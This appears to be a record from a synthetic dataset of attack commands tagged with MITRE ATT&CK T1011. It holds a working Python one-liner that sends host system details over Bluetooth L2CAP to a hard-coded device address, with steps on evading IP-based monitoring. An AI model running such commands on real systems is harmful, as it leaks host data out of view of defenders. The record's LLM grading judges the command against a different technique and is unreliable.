{
  "technique_id": "T1011",
  "platform": "Linux",
  "shell": "Python",
  "command": "python3 -c \"import socket,platform; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP); s.settimeout(6); s.connect(('5C:F3:70:12:34:56', 0x1003)); s.sendall(('sys='+str(platform.uname())+'\\n').encode()); s.close()\"",
  "explanation": "Sends host identification over Bluetooth L2CAP PSM 0x1003, bypassing IP-centric monitoring systems per T1011.",
  "rationale_steps": [
    "Pick L2CAP to avoid the main IP-based monitoring plane.",
    "Use a less-common PSM (0x1003) to reduce service collisions.",
    "Serialize minimal system info and send over L2CAP.",
    "Close cleanly to prevent lingering connections."
  ],
  "obfuscation_level": "none",
  "id": "SYN-PYTHON-T1011-2e02ce6e-d365518a",
  "source_prompt_hash": "2e02ce6e",
  "timestamp_utc": "2025-09-30T08:40:28.862749Z",
  "validation": {
    "syntax_ok": null,
    "llm_judgments": [
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "The python3 -c invocation is properly quoted and uses valid Python socket API calls with balanced parentheses and correct statement separators.",
        "semantic_score": 2,
        "semantic_justification": "Although it plausibly sends host identification over Bluetooth L2CAP, it does not reflect System Script Proxy Execution as described (uses direct Python networking, not trusted/signed system scripts via script hosts).",
        "combined_score": 3.5,
        "confidence": 0.78,
        "timestamp": "2025-10-01T22:05:12.427342Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 2.0,
    "llm_average_score": 3.5,
    "llm_verdict": "uncertain",
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}